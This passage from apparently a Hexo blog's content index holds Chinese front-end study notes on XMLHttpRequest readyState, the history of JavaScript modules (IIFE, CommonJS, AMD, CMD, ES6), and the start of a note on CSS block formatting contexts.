class="string">&#x27;http://....&#x27;</span>);</span><br><span class="line">xhr.<span class="title function_">send</span>();</span><br><span class="line">xhr.<span class="property">onreadystatechange</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(xhr.<span class="property">readyState</span> == <span class="number">4</span> &amp;&amp; xhr.<span class="property">status</span> == <span class="number">200</span>)&#123;</span><br><span class="line">        xhr.<span class="property">status</span>; <span class="comment">//状态码</span></span><br><span class="line">        xhr.<span class="property">statusText</span>; <span class="comment">//状态码字符串</span></span><br><span class="line">        xhr.<span class="title function_">getAllResponseHeaders</span>();  <span class="comment">//所有响应头</span></span><br><span class="line">        xhr.<span class="property">response</span>; <span class="comment">//响应体</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>xhr.abort()</p></blockquote><h3 id="4.-readystate">4. readyState<a title="#4.-readystate" href="#4.-readystate"></a></h3><p>表示请求发送的状态 0 1 2 3 4</p><p>0：未初始化 — 初始状态</p><p>1：启动 — open后</p><p>2：发送 — send后</p><p>3：接收 — 返回了部分数据</p><p>4：完成 — 返回了所有数据</p>]]></content>
      
      
      <categories>
          
          <category> furtherNotes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> js </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>模块化历程</title>
      <link href="/furtherNotes/further/01%20%E6%A8%A1%E5%9D%97%E5%8C%96%E5%8E%86%E7%A8%8B"/>
      <url>/furtherNotes/further/01%20%E6%A8%A1%E5%9D%97%E5%8C%96%E5%8E%86%E7%A8%8B</url>
      
        <content type="html"><![CDATA[<blockquote><p>项目涉及到的模块化</p><p><a href="https://juejin.cn/post/6844903744518389768" target="_blank">参考的主要链接</a></p></blockquote><h1 id="前端模块化：commonjs、amd、cmd、es6">前端模块化：CommonJS、AMD、CMD、ES6<a title="#前端模块化：commonjs、amd、cmd、es6" href="#前端模块化：commonjs、amd、cmd、es6"></a></h1><h2 id="1.模块化的理解">1.模块化的理解<a title="#1.模块化的理解" href="#1.模块化的理解"></a></h2><ul><li>将一个复杂的程序依据一定的规则(规范)封装成几个块（文件），并进行组合在一起</li><li>块的内部数据与实现是私有的，只是想外部暴露一些接口（方法）与外部其他模块通信</li></ul><h2 id="2.模块化进化过程">2.模块化进化过程<a title="#2.模块化进化过程" href="#2.模块化进化过程"></a></h2><h4 id="2.1-全局-function-模式">2.1 全局 function 模式<a title="#2.1-全局-function-模式" href="#2.1-全局-function-模式"></a></h4><ul><li>编码：将不同的功能封装成不同的全局函数</li><li>问题：污染全局命名空间，容易引擎命名冲突或数据不安全，模块成员之间看不出关系</li></ul><h4 id="2.2-namespace-模式">2.2 namespace 模式<a title="#2.2-namespace-模式" href="#2.2-namespace-模式"></a></h4><ul><li><p>编码：将不同功能封装在对象属性里</p></li><li><p>作用：解决了全局变量，解决命名冲突</p></li><li><p>问题：数据不安全，会暴露所有模块成员，内部成员状态可以被外部改写</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> myModule = &#123;</span><br><span class="line">    <span class="attr">name</span>:<span class="string">&#x27;qsh&#x27;</span>,</span><br><span class="line">    <span class="title function_">foo</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`foo <span class="subst">$&#123; <span class="variable language_">this</span>.data &#125;</span>`</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">myModule.<span class="property">data</span> = <span class="string">&#x27;qrc&#x27;</span></span><br><span class="line">myModule.<span class="title function_">foo</span>()  <span class="comment">// foo qrc</span></span><br></pre></td></tr></table></figure></li></ul><h4 id="2.3-iife-模式：匿名函数子调用（闭包）">2.3 IIFE 模式：匿名函数子调用（闭包）<a title="#2.3-iife-模式：匿名函数子调用（闭包）" href="#2.3-iife-模式：匿名函数子调用（闭包）"></a></h4><ul><li><p>编码：将数据和行为封装到一个函数内部，通过给window添加属性来向外暴露成员</p></li><li><p>作用：数据私有，外部只能通过暴露的方法操作</p></li><li><p>问题：如果当前模块怎么依赖另一个模块</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&#x27;module.js&#x27;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">myModule.<span class="title function_">foo</span>() <span class="comment">// foo qsh</span></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// module.js</span></span><br><span class="line">(<span class="keyword">function</span>(<span class="params"><span class="variable language_">window</span></span>)&#123;</span><br><span class="line">    <span class="keyword">let</span> data = <span class="string">&#x27;qsh&#x27;</span>;</span><br><span class="line">    <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`foo <span class="subst">$&#123; <span class="variable language_">this</span>.data &#125;</span>`</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">window</span>.<span class="property">myModule</span> = &#123; foo &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li></ul><h4 id="2.4-iife-模式增强：引入依赖">2.4 IIFE 模式增强：引入依赖<a title="#2.4-iife-模式增强：引入依赖" href="#2.4-iife-模式增强：引入依赖"></a></h4><ul><li><p>现在模块化的基石</p></li><li><p>好处：保证了模块的独立性，使得模块之间的依赖关系变得明显</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// module.js</span></span><br><span class="line">(<span class="keyword">function</span>(<span class="params"><span class="variable language_">window</span>,$</span>)&#123;</span><br><span class="line">    <span class="keyword">let</span> data = <span class="string">&#x27;qsh&#x27;</span>;</span><br><span class="line">    <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`foo <span class="subst">$&#123; <span class="variable language_">this</span>.data &#125;</span>`</span>);</span><br><span class="line">        $(<span class="string">&#x27;body&#x27;</span>).<span class="title function_">css</span>(<span class="string">&#x27;background&#x27;</span>,<span class="string">&#x27;red&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">window</span>.<span class="property">myModule</span> = &#123; foo &#125;</span><br><span class="line">&#125;)(<span class="variable language_">window</span>,jQuery)</span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 引入的js必须有一定顺序 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;jquery-1.10.1.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;module.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  myModule.<span class="title function_">foo</span>() <span class="comment">// foo qsh</span></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul><h2 id="3.模块化的好处">3.模块化的好处<a title="#3.模块化的好处" href="#3.模块化的好处"></a></h2><ul><li>避免命名冲突，减少命名空间污染</li><li>更好分离，按需加载</li><li>更高复用性</li><li>高可维护性</li></ul><h2 id="4.-引入多个&lt;script&gt;后出现的问题">4. 引入多个<code>&lt;script&gt;</code>后出现的问题<a title="#4.-引入多个&lt;script&gt;后出现的问题" href="#4.-引入多个&lt;script&gt;后出现的问题"></a></h2><ul><li><p>请求过多</p><blockquote><p>要依赖多个模块，这就会发送多个请求，导致请求过多</p></blockquote></li><li><p>依赖模糊</p><blockquote><p>不知道具体的依赖关系，有可能因此导致加载先后顺序出错</p></blockquote></li><li><p>难以维护</p><blockquote><p>以上原因导致了难维护性。</p></blockquote><p>模块化固然有多个好处，然而一个页面需要引入多个js文件，就会出现以上问题，这些问题可以通过模块化规范来解决。</p></li></ul><h2 id="5.模块化规范">5.模块化规范<a title="#5.模块化规范" href="#5.模块化规范"></a></h2><h3 id="5.1-commonjs">5.1 CommonJS<a title="#5.1-commonjs" href="#5.1-commonjs"></a></h3><h5 id="5.1.1-概述">5.1.1 概述<a title="#5.1.1-概述" href="#5.1.1-概述"></a></h5><p>Node 应用由模块组成，采用CommonJS 模块规范，每个文件就是一个模块，有自己的作用域。</p><p><strong>加载模块是同步的，只有加载完成，才能执行后面的操作。</strong></p><p><strong>在服务器端，模块的加载时运行时同步加载的；</strong></p><p><strong>在浏览器端，模块需要提前编译打包处理。</strong></p><h5 id="5.1.2-特点">5.1.2 特点<a title="#5.1.2-特点" href="#5.1.2-特点"></a></h5><ul><li>所有代码都运行在模块作用域，不会污染全局作用域</li><li>模块可以多次加载，但只会在第一次加载时运行一次，然后运行结果会被缓存，再此加载的时候，就直接读取缓存结果。若要让模块再次加载，必须清除缓存。</li><li>模块的加载顺序，按照其在代码出现的顺序</li></ul><h5 id="5.1.3-基本语法">5.1.3 基本语法<a title="#5.1.3-基本语法" href="#5.1.3-基本语法"></a></h5><ul><li><p>导出：<code>module.exports = value</code> 或 <code>exports.xxx = value</code></p></li><li><p>导入：<code>require(xxx)</code></p><blockquote><p>if 第三方模块 xxx 为模块名；if 自定义模块 xxx 为文件路径</p></blockquote></li></ul><h5 id="5.1.4-问题">5.1.4 问题<a title="#5.1.4-问题" href="#5.1.4-问题"></a></h5><p><strong>Q:</strong> <strong>CommonJS 暴露的模块是什么？</strong></p><p><strong>A:</strong> CommonJS 规范规定，每个模块内部，module 代表当前模块，module.exports 是对外的接口。<strong>加载某个模块，其实是加载该模块的 module.exports 属性</strong>。</p><p><strong>Q:</strong> require 命令用来干什么？</p><p><strong>A:</strong> 用于<strong>加载模块文件</strong>。其基本功能是，<strong>读入并执行一个 JavaScript 文件，然后返回该模块的 exports 对象。如果没有发现指定模块，会报错。</strong></p><h5 id="5.1.5-模块的加载机制">5.1.5 模块的加载机制<a title="#5.1.5-模块的加载机制" href="#5.1.5-模块的加载机制"></a></h5><p>输入的是被输出的值的拷贝。模块内部的变化就影响不到这个输出的值。</p><blockquote><p>其实是 <strong>按值传递(原始类型) 和 [按共享传递(引用类型)](./es <a href="http://xn--fiqywt0ak5cz6cqw0b70dba33or67fga7169efrc.md">中函数的参数都是按值传递的.md</a>)</strong></p></blockquote><p>这与ES6模块化有重大差异。</p><h5 id="5.1.6-服务器端实现">5.1.6 服务器端实现<a title="#5.1.6-服务器端实现" href="#5.1.6-服务器端实现"></a></h5><ol><li>下载 node.js</li><li>创建项目结构 npm init （package name 不能有中文名）</li><li>下载第三方模块 npm install uniq –save</li><li>定义模块代码</li><li>运行 js 代码 node xxx.js</li></ol><h5 id="5.1.7-浏览器端实现">5.1.7 浏览器端实现<a title="#5.1.7-浏览器端实现" href="#5.1.7-浏览器端实现"></a></h5><ol><li>创建项目结构 dist + src + index.html + package.json</li><li>下载 browserify 全局 -g 局部 –save-dev</li><li>定义模块代码 借助 browserify 打包 xxx.js 文件打包编译，（直接导入html 会报错）</li><li>导报处理js  根目录运行 browserify js/src/app.js -o js/dist/bundle.js</li><li>index.html 引入<code> &lt;script type=&quot;text/javascript&quot; src=&quot;js/dist/bundle.js&quot;&gt;&lt;/script&gt;</code></li></ol><h3 id="5.2-amd">5.2 AMD<a title="#5.2-amd" href="#5.2-amd"></a></h3><h5 id="5.2.1-概述">5.2.1 概述<a title="#5.2.1-概述" href="#5.2.1-概述"></a></h5><p>CommonJS 加载模块是同步的，只有加载完成，才能执行后面的操作。</p><p><strong>AMD 则是非同步加载模块，允许指定回调函数。</strong></p><h5 id="5.2.2-特点">5.2.2 特点<a title="#5.2.2-特点" href="#5.2.2-特点"></a></h5><ul><li>定义方法非常清晰</li><li>不会污染全局变量</li><li>清楚显示依赖关系</li><li>可用于浏览器环境，允许非同步加载模块，指定回调函数，可以根据动态加载模块</li></ul><h5 id="5.2.3-适用情况">5.2.3 适用情况<a title="#5.2.3-适用情况" href="#5.2.3-适用情况"></a></h5><p>因为 <strong>node.js</strong> 主要用于服务器编程，模块文件已经存在本地硬盘，所以加载比较块，不用考虑非同步加载的方式，所以 <strong>CommonJS 比较适用</strong>。</p><p>如果是浏览器环境，要从服务器端加载模块，就必须采用非同步，因此<strong>浏览器一般采用 AMD</strong>。</p><blockquote><p>AMD 比 CommonJS 在浏览器端实现 早</p></blockquote><h5 id="5.2.4-基本语法">5.2.4 基本语法<a title="#5.2.4-基本语法" href="#5.2.4-基本语法"></a></h5><ul><li><p>导出：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 定义没有依赖的模块</span></span><br><span class="line"><span class="title function_">define</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> 模块</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义有依赖的模块</span></span><br><span class="line"><span class="title function_">define</span>([<span class="string">&#x27;module1&#x27;</span>,<span class="string">&#x27;module2&#x27;</span>],<span class="keyword">function</span>(<span class="params">m1,m2</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> 模块</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li><li><p>导入：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>([<span class="string">&#x27;module1&#x27;</span>,<span class="string">&#x27;module2&#x27;</span>],<span class="keyword">function</span>(<span class="params">m1,m2</span>)&#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li></ul><h5 id="5.2.5-使用require.js">5.2.5 使用require.js<a title="#5.2.5-使用require.js" href="#5.2.5-使用require.js"></a></h5><blockquote><p>RequireJS 是一个工具库，主要用于客户端的模块管理。其遵守 AMD 规范。<strong>其基本思想是，通过 define 方法，将代码定义为模块；通过 require 方法，实现代码的模块加载。</strong></p></blockquote><p>AMD 在浏览器实现的步骤：</p><ol><li><p>下载引入 require.js  <a href="http://www.requirejs.cn/" target="_blank">官网</a> <a href="https://github.com/requirejs/requirejs" target="_blank">github</a></p><p>将 require.js 导入项目： js/libs/require.js</p></li><li><p>创建项目结构  js &gt; libs + module + main.js      &lt; + index.html</p></li><li><p>定义 require.js 的模块代码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// data.js</span></span><br><span class="line"><span class="title function_">define</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">getmsg</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;data&#x27;</span></span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> &#123; getmsg &#125;;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">//alterdata.js</span></span><br><span class="line"><span class="title function_">define</span>([<span class="string">&#x27;data&#x27;</span>,<span class="string">&#x27;jquery&#x27;</span>,<span class="keyword">function</span>(<span class="params">data,$</span>)&#123;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">showmsg</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="title function_">alter</span>(data.<span class="title function_">getmsg</span>());</span><br><span class="line">        $(<span class="string">&#x27;body&#x27;</span>).<span class="title function_">css</span>(<span class="string">&#x27;background&#x27;</span>, <span class="string">&#x27;green&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> &#123; showmsg &#125;;</span><br><span class="line">&#125;])</span><br><span class="line"></span><br><span class="line"><span class="comment">//main.js</span></span><br><span class="line">(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="built_in">require</span>.<span class="title function_">config</span>(&#123;</span><br><span class="line">        <span class="attr">baseUrl</span>:<span class="string">&#x27;js/&#x27;</span>,</span><br><span class="line">        <span class="attr">path</span>:&#123;      <span class="comment">// 映射</span></span><br><span class="line">            <span class="attr">alterdata</span>:<span class="string">&#x27;./modules/alterdata&#x27;</span>,</span><br><span class="line">            <span class="attr">data</span>:<span class="string">&#x27;./module/data&#x27;</span>,</span><br><span class="line">            <span class="attr">jquery</span>:<span class="string">&#x27;./libs/jquery-1.10.1&#x27;</span>   <span class="comment">//jQuery 报错</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="built_in">require</span>([<span class="string">&#x27;alterdata&#x27;</span>],<span class="keyword">function</span>(<span class="params">alterdata</span>)&#123;</span><br><span class="line">        alterdata.<span class="title function_">showmsg</span>()</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)()</span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">data-main</span>=<span class="string">&quot;js/main&quot;</span> <span class="attr">src</span>=<span class="string">&quot;js/libs/require.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ol><h3 id="5.3-cmd">5.3 CMD<a title="#5.3-cmd" href="#5.3-cmd"></a></h3><h5 id="5.3.1-基本概念">5.3.1 基本概念<a title="#5.3.1-基本概念" href="#5.3.1-基本概念"></a></h5><p><strong>CMD 专门用于浏览器端，模块异步加载，使用时才会加载执行</strong>。其整合了 CommonJS 和 AMD 的特点。在 Sea.js 种，所有 JavaScript 模块都遵循 CMD 规范。</p><h5 id="5.3.2-基本语法">5.3.2 基本语法<a title="#5.3.2-基本语法" href="#5.3.2-基本语法"></a></h5><ul><li><p>导出：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 定义没有依赖的模块</span></span><br><span class="line"><span class="title function_">define</span>(<span class="keyword">function</span>(<span class="params"><span class="built_in">require</span>, <span class="built_in">exports</span>, <span class="variable language_">module</span></span>)&#123;</span><br><span class="line">    <span class="built_in">exports</span>.<span class="property">xxx</span> = val;</span><br><span class="line">    <span class="variable language_">module</span>.<span class="property">exports</span> = val;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义有依赖的模块</span></span><br><span class="line"><span class="title function_">define</span>(<span class="keyword">function</span>(<span class="params"><span class="built_in">require</span>, <span class="built_in">exports</span>, <span class="variable language_">module</span></span>)&#123;</span><br><span class="line">    <span class="comment">// 同步引入依赖模块</span></span><br><span class="line">    <span class="keyword">const</span> module2 = <span class="built_in">require</span>(<span class="string">&#x27;./module2&#x27;</span>)</span><br><span class="line">    <span class="comment">// 异步引入依赖模块</span></span><br><span class="line">    <span class="built_in">require</span>.<span class="title function_">async</span>(<span class="string">&#x27;./module3&#x27;</span>,<span class="function">(<span class="params">m3</span>) =&gt;</span> &#123;</span><br><span class="line">        </span><br><span class="line">    &#125;)</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">exports</span>.<span class="property">xxx</span> = val;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li><li><p>导入：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">define</span>(<span class="keyword">function</span>(<span class="params"><span class="built_in">require</span></span>)&#123;</span><br><span class="line">    <span class="keyword">let</span> m1 = <span class="built_in">require</span>(<span class="string">&#x27;./module1&#x27;</span>);</span><br><span class="line">    m1.<span class="title function_">show</span>()</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li></ul><h5 id="5.3.3-sea.js-使用">5.3.3 sea.js 使用<a title="#5.3.3-sea.js-使用" href="#5.3.3-sea.js-使用"></a></h5><ol><li><p>下载sea.js 并引入 js/libs/sea.js  <a href="seajs.org/">官网</a>  <a href="github.com/seajs/seajs">github</a></p></li><li><p>创建项目结构  js &gt; libs + module &lt; +  index.html</p></li><li><p>定义sea.js 模块代码</p></li><li><p>引入index.html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;js/libs/sea.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  seajs.<span class="title function_">use</span>(<span class="string">&#x27;./js/modules/main&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ol><h3 id="5.4-es6">5.4 ES6<a title="#5.4-es6" href="#5.4-es6"></a></h3><h5 id="5.4.1-基本概念">5.4.1 基本概念<a title="#5.4.1-基本概念" href="#5.4.1-基本概念"></a></h5><p>ES6 模块的设计思想是<strong>尽量的静态化</strong>，使得<strong>编译时就能确定模块的依赖关系，以及输入和输出的变量</strong>。CommonJS 和 AMD 都只能在<strong>运行时</strong>确定这些东西。比如，CommonJS 模块就是对象，输入时必须查找对象属性。</p><h5 id="5.4.2-es6-模块化语法">5.4.2 ES6 模块化语法<a title="#5.4.2-es6-模块化语法" href="#5.4.2-es6-模块化语法"></a></h5><ul><li>导出：export { xxx }  / export default xxx</li><li>导入：import { xxx } from …   /  import xxx from …</li></ul><h5 id="5.4.3-&lt;font-color='red'&gt;es6-模块与-commonjs-模块的差异&lt;/font&gt;">5.4.3 <font color='red'>ES6 模块与 CommonJS 模块的差异</font><a title="#5.4.3-&lt;font-color='red'&gt;es6-模块与-commonjs-模块的差异&lt;/font&gt;" href="#5.4.3-&lt;font-color='red'&gt;es6-模块与-commonjs-模块的差异&lt;/font&gt;"></a></h5><ol><li><p><strong>CommonJS 输出的是值的拷贝；ES6 Module 输出的是值的引用</strong></p><blockquote><p>ES6 Module 的运行机制与 CommonJS 不一样。<strong>ES6 Module 是动态引用，并且不会缓存值，模块里面的变量绑定其所在的模块。</strong></p></blockquote></li><li><p><strong>CommonJS 是运行时加载；ES6 Module 时编译时输出接口</strong></p><blockquote><p>因为 CommonJS 加载的是一个对象，即 module.exports 属性，该对象只有在脚本运行完才会生成。</p><p>而 ES6 Module 不是对象，它的对外接口只是一种静态定义，在代码静态解析阶段就会生成</p></blockquote></li></ol><h5 id="5.4.4--es6-babel-browserify-使用">5.4.4  ES6-Babel-Browserify 使用<a title="#5.4.4--es6-babel-browserify-使用" href="#5.4.4--es6-babel-browserify-使用"></a></h5><p>使用 Babel 将 ES6 编译为 ES5 代码，使用 Browserify 编译打包js</p><ol><li>定义package.json 文件</li><li>安装babel-cil，babel-preset-es2015 和 browserify</li><li>定义 .babelrc 文件</li><li>定义模块代码</li><li>导入index.html</li></ol><h2 id="6.-总结">6. 总结<a title="#6.-总结" href="#6.-总结"></a></h2><ul><li>CommonJS规范主要用于<strong>服务端编程</strong>，加载模块是<strong>同步</strong>的，有缓存，这并不适合在浏览器环境，因为<strong>同步意味着阻塞加载，浏览器资源是异步加载的</strong>，因此有了AMD CMD解决方案。</li><li>AMD规范在<strong>浏览器环境中异步加载模块</strong>，而且可以<strong>并行加载</strong>多个模块。不过，AMD规范开发成本高，代码的阅读和书写比较困难，模块定义方式的语义不顺畅。</li><li>CMD规范与AMD规范很相似，都用于<strong>浏览器编程</strong>，<strong>依赖就近，延迟执行</strong>，可以很容易在Node.js中运行。不过，依赖　SPM 打包，模块的加载逻辑偏重。</li><li><strong>ES6 在语言标准的层面上，实现了模块功能，而且实现得相当简单，完全可以取代 CommonJS 和 AMD 规范，成为浏览器和服务器通用的模块解决方案</strong>。</li></ul>]]></content>
      
      
      <categories>
          
          <category> furtherNotes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> js </tag>
            
            <tag> es6 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BFC 和 触发BFC</title>
      <link href="/furtherNotes/further/BFC%20%E5%92%8C%20%E8%A7%A6%E5%8F%91BFC"/>
      <url>/furtherNotes/further/BFC%20%E5%92%8C%20%E8%A7%A6%E5%8F%91BFC</url>
      
        <content type="html"><![CDATA[<h4 id="1.常见定位方案">1.常见定位方案<a title="#1.常见定位方案" href="#1.常见定位方案"></a></h4><ul><li>普通流 (normal flow)</li></ul><blockquote><p>在普通流中，元素按照其在 HTML 中的先后位置至上而下布局，在这个过程中，行内元素水平排列，直到当行被占满然后换行，块级元素则会被渲染为完整的一个新行，除非另外指定，否则所有元素默认都是普通流定位，也可以说，普通流中元素的位置由该元素在 HTML 文档中的位置决定。</p></blockquote><ul><li>浮动 (float)</li></ul><blockquote><p>在浮动布局中，元素首先按照普通流的位置出现，然后根据浮动的方向尽可能的向左边或右边偏移，其效果与印刷排版中的文本环绕相似。</p></blockquote><ul><li>绝对定位 (absolute positioning)</li></ul><blockquote><p>在绝对定位布局中，元素会整体脱离普通流，因此绝对定位元素不会对其兄弟元素造成影响，而元素具体的位置由绝对定位的坐标决定。</p></blockquote><h4 id="2.bfc是什么">2.BFC是什么<a title="#2.bfc是什么" href="#2.bfc是什么"></a></h4><p><strong>块格式化上下文（Block Formatting Context，BFC）</strong> 是Web页面的可视CSS渲染的一部分，是块盒子的布局过程发生的区域，也是浮动元素与其他元素交互的区域。属于上述定位方案的普通流。</p><blockquote><p><strong>具有 BFC 特性的元素可以看作是隔离了的独立容器，容器里面的元素不会在布局上影响到外面的元素，并且 BFC 具有普通容器所没有的一些特性。</strong></p><p>通俗一点来讲，可以把 BFC 理解为一个封闭的大箱子，箱子内部的元素无论如何翻江倒海，都不会影响到外部。</p></blockquote><h4 id="3.触发/创建-bfc">3.触发/创建 BFC<a title="#3.触发/创建-bfc" href="#3.触发/创建-bfc"></a></h4><p>简洁版：</p><ul><li>body根元素</li><li>浮动元素：float 除 none 以外的值</li><li>绝对定位元素：position (absolute、fixed)</li><li>display ( inline-block、table-cells、flex )</li><li>overflow 除 visible 以外的值 ( hidden、auto、scroll )</li></ul><p>详细版：</p><blockquote><ul><li>根元素（<code>&lt;html&gt;</code>）</li><li>浮动元素（元素的 <code>float</code> 不是 <code>none</code>）</li><li>绝对定位元素（元素的 <code>position</code> 为 <code>absolute</code> 或 <code>fixed</code>）</li><li>行内块元素（元素的 <code>display</code>为 <code>inline-block</code>）</li><li>表格单元格（元素的 <code>display</code>为 <code>table-cell</code>，HTML表格单元格默认为该值）</li><li>表格标题（元素的 <code>display</code>为 <code>table-caption</code>，HTML表格标题默认为该值）</li><li>匿名表格单元格元素（元素的 <code>display</code>为 <code>table</code>、<code>table-row</code>、 <code>table-row-group</code>、<code>table-header-group</code>、<code>table-footer-group</code>（分别是HTML 